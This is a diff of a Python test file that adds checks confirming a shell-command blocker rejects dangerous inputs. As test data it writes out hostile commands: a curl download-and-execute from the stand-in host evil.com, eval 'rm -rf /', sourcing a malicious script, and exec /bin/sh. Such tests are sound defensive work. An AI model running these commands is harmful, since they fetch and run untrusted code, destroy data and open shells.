@@ -137,3 +137,8 @@ class TestShellBlocking:
 
     def test_blocks_download_execute(self):
         assert _is_blocked("curl http://evil.com -o /tmp/x && chmod +x /tmp/x")
+
+    def test_blocks_eval_source_exec(self):
+        assert _is_blocked("eval 'rm -rf /'")
+        assert _is_blocked("source /tmp/malicious.sh")
+        assert _is_blocked("exec /bin/sh")
